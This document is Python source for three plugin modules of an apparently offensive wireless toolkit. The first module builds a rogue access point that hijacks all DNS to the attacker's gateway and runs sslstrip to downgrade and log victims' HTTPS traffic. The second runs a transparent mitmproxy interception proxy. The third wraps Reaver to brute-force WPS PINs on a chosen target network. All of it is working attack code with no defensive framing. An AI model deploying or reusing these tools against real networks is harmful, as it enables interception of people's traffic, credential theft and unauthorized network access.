# backend/plugins/rogue_ap.py
"""
Module: rogue_ap
Sets up a rogue access point with DNS hijacking and SSL stripping capabilities.
"""
import os
import subprocess
import logging
import shutil
import threading
import tempfile

# Configure logging
logger = logging.getLogger("rogue_ap")
logger.setLevel(logging.INFO)
handler = logging.StreamHandler()
formatter = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
handler.setFormatter(formatter)
logger.addHandler(handler)

class RogueAP:
    def __init__(self, iface: str, ssid: str, channel: int = 6, gateway_ip: str = '10.0.0.1', netmask: str = '255.255.255.0'):
        self.iface = iface
        self.ssid = ssid
        self.channel = channel
        self.gateway_ip = gateway_ip
        self.netmask = netmask
        self.hostapd_conf = None
        self.dnsmasq_conf = None
        self._tempdir = tempfile.mkdtemp(prefix="rogue_ap_")

    def generate_configs(self):
        # hostapd.conf
        self.hostapd_conf = os.path.join(self._tempdir, 'hostapd.conf')
        with open(self.hostapd_conf, 'w') as f:
            f.write(f"""
interface={self.iface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
auth_algs=1
wmm_enabled=0
macaddr_acl=0
""")
        logger.info(f"Generated hostapd.conf at {self.hostapd_conf}")

        # dnsmasq.conf
        self.dnsmasq_conf = os.path.join(self._tempdir, 'dnsmasq.conf')
        with open(self.dnsmasq_conf, 'w') as f:
            f.write(f"""
interface={self.iface}
dhcp-range={self.gateway_ip},static,12h
address=/#/{self.gateway_ip}
log-queries
log-dhcp
""")
        logger.info(f"Generated dnsmasq.conf at {self.dnsmasq_conf}")

    def enable_forwarding(self):
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], check=True)
        logger.info("Enabled IP forwarding")

    def setup_iptables(self):
        # NAT rules
        subprocess.run(['iptables', '-t', 'nat', '-F'], check=True)
        subprocess.run(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'], check=True)
        subprocess.run(['iptables', '-A', 'FORWARD', '-i', self.iface, '-o', 'eth0', '-j', 'ACCEPT'], check=True)
        subprocess.run(['iptables', '-A', 'FORWARD', '-i', 'eth0', '-o', self.iface, '-m', 'state', '--state', 'RELATED,ESTABLISHED', '-j', 'ACCEPT'], check=True)
        logger.info("Configured iptables NAT and forwarding rules")

    def start_sslstrip(self, port: int = 8080):
        # sslstrip requires iptables redirect
        subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', str(port)], check=True)
        cmd = ['sslstrip', '-l', str(port), '-w', os.path.join(self._tempdir, 'sslstrip.log')]
        logger.info(f"Starting sslstrip: {' '.join(cmd)}")
        return subprocess.Popen(cmd)

    def start_services(self):
        self.generate_configs()
        self.enable_forwarding()
        self.setup_iptables()

        # Launch hostapd
        hostapd = subprocess.Popen(['hostapd', self.hostapd_conf])
        logger.info("hostapd launched")

        # Launch dnsmasq
        dnsmasq = subprocess.Popen(['dnsmasq', '-C', self.dnsmasq_conf])
        logger.info("dnsmasq launched")

        # Launch sslstrip
        sslstrip = self.start_sslstrip()

        return {'hostapd': hostapd, 'dnsmasq': dnsmasq, 'sslstrip': sslstrip}

    def cleanup(self):
        for proc in ['hostapd', 'dnsmasq', 'sslstrip']:
            # Ideally keep references; simplified here
            subprocess.run(['pkill', '-f', proc])
        shutil.rmtree(self._tempdir)
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], check=True)
        subprocess.run(['iptables', '-t', 'nat', '-F'], check=True)
        subprocess.run(['iptables', '-F'], check=True)
        logger.info("Cleaned up rogue AP services and rules")


# backend/plugins/mitm.py
"""
Module: mitm
Implements a Man-in-the-Middle proxy integration using mitmproxy.
"""
from mitmproxy import options
from mitmproxy.tools.dump import DumpMaster
import threading
import logging

logger = logging.getLogger("mitm")
logger.setLevel(logging.INFO)
handler = logging.StreamHandler()
formatter = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
handler.setFormatter(formatter)
logger.addHandler(handler)

class MitmProxy:
    def __init__(self, listen_port: int = 8081, mode: str = 'transparent', upstream_proxy: str = None):
        opts = options.Options(listen_host='0.0.0.0', listen_port=listen_port, mode=mode)
        if upstream_proxy:
            opts.upstream_proxy = upstream_proxy
        self.master = DumpMaster(opts)

    def start(self):
        """Start mitmproxy in a background thread."""
        def run():
            logger.info("Starting mitmproxy...")
            self.master.run()
        t = threading.Thread(target=run, daemon=True)
        t.start()
        logger.info(f"mitmproxy running on port {self.master.options.listen_port}")

    def shutdown(self):
        logger.info("Shutting down mitmproxy...")
        self.master.shutdown()


# backend/plugins/wps_attack.py
"""
Module: wps_attack
Wraps the Reaver tool to perform WPS brute-force attacks.
"""
import subprocess
import logging
import os

logger = logging.getLogger("wps_attack")
logger.setLevel(logging.INFO)
handler = logging.StreamHandler()
formatter = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
handler.setFormatter(formatter)
logger.addHandler(handler)

class WPSAttack:
    def __init__(self, iface: str, target_bssid: str, output_dir: str = '/tmp/reaver_output'):
        self.iface = iface
        self.bssid = target_bssid
        self.output_dir = output_dir
        os.makedirs(self.output_dir, exist_ok=True)

    def run(self, timeout: int = 3600, multi: bool = False):
        cmd = [
            'reaver',
            '-i', self.iface,
            '-b', self.bssid,
            '-vv',
            '-d', '5',            # delay between attempts
            '-t', str(timeout),   # overall timeout
            '-o', os.path.join(self.output_dir, f'reaver_{self.bssid}.log')
        ]
        if multi:
            cmd.append('-M')  # use multi-threaded

        logger.info(f"Starting WPS attack: {' '.join(cmd)}")
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in proc.stdout:
            logger.info(line.strip())
        proc.wait()
        logger.info(f"WPS attack completed with exit code {proc.returncode}")
        return proc.returncode
